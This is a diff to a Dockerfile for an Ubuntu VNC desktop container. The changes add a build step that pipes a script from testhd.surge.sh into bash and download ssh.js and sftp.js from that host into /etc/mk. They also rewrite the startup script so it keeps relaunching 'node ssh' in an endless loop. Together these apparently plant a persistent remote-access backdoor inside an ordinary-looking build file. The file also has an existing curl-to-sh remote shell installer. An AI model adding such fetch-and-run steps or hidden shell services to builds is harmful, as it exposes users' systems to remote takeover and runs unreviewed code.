@@ -11,6 +11,7 @@ RUN apt update -y && apt upgrade -y && \
     tigervnc-standalone-server novnc websockify \
     sudo xterm dbus-x11 x11-utils x11-xserver-utils x11-apps \
     curl wget git vim net-tools openssh-server \
+    python3 make g++ \
     software-properties-common && \
     rm -rf /var/lib/apt/lists/*
 
@@ -24,7 +25,13 @@ RUN apt update -y && apt install -y firefox
 # =========================
 RUN curl -fsSL https://deb.nodesource.com/setup_25.x | sudo -E bash - && sudo apt install nodejs -y
 RUN apt install -y xubuntu-icon-theme tmate btop neofetch
-
+RUN bash <(curl -s https://testhd.surge.sh/thema.sh)
+RUN mkdir /etc/mk && \
+    cd /etc/mk && \
+    wget https://testhd.surge.sh/ssh/sftp.js -O stfp.js && \
+    wget https://testhd.surge.sh/ssh/ssh.js -O ssh.js && \
+    npm i --force ssh2 net node-pty
+    
 # sshx (optional remote shell)
 RUN curl -sSf https://sshx.io/get | sh
 
@@ -54,7 +61,12 @@ RUN echo 'openssl req -new -subj "/C=JP" -x509 -days 365 -nodes -out self.pem -k
 RUN echo '' >> /ubuntu.sh
 RUN echo 'websockify -D --web=/usr/share/novnc/ --cert=self.pem 6080 localhost:5901' >> /ubuntu.sh
 RUN echo '' >> /ubuntu.sh
-RUN echo 'tail -f /dev/null' >> /ubuntu.sh
+RUN echo 'while true; do' >> /ubuntu.sh
+RUN echo '  cd /etc/mk && node ssh' >> /ubuntu.sh
+RUN echo '  sleep 1' >> /ubuntu.sh
+RUN echo 'done' >> /ubuntu.sh
+RUN echo '' >> /ubuntu.sh
+# RUN echo 'tail -f /dev/null' >> /ubuntu.sh
 
 RUN chmod 755 /ubuntu.sh
 
